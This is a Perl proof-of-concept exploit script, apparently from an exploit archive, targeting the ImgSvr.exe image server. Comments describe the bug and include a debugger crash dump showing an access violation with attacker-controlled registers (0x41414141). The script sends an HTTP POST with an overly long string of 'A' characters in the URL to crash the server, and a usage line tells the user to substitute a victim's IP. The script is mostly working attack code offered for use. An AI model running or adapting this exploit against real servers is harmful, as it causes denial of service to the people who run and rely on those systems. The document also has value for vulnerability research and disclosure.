#!/usr/bin/perl
##Proof of concept.
#################################################################################
#Credit's:to n00b for finding this bug.
#
#Afected :ImgSvr.exe
#
#Download softwear: http://freshmeat.net/projects/imgsvr/
#
#Crash the server with overly long http post request..
#
#Main site of affected product. http://freshmeat.net/projects/imgsvr/
#Sending an overly long post request will crash the server with the following.
#Acsess violation..
#Tested :win xp sp1..
#
#error:500 Server closed connection without sending any data back
#this is a error msg will receive on successful exploitation.
#################################################################################
##(e7c.168): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=41414142 ebx=00000000 ecx=00000000 edx=00000002 esi=41414141 edi=00000000
# eip=006bf546 esp=022ab1c4 ebp=022ab628 iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206
# *** WARNING: Unable to verify checksum for C:\Program Files\Imgsvr\imgsvr.exe
# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\Imgsvr\imgsvr.exe
# imgsvr+0x2bf546:
# 006bf546 881c30           mov     [eax+esi],bl            ds:0023:82828283=??
###################################################################################
#
# Usage: imageserv.pl change to your ip 127.0.0.1 < vic ip port 1235
###################################################################################


use LWP::UserAgent;
  $ua = LWP::UserAgent->new;

my $req = HTTP::Request->new(POST =>
'http://127.0.0.1:1235/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

$req->content_type('application/x-www-form-urlencoded');
$req->content('match=www&errors=0');

my $res = $ua->request($req);
print $res->as_string;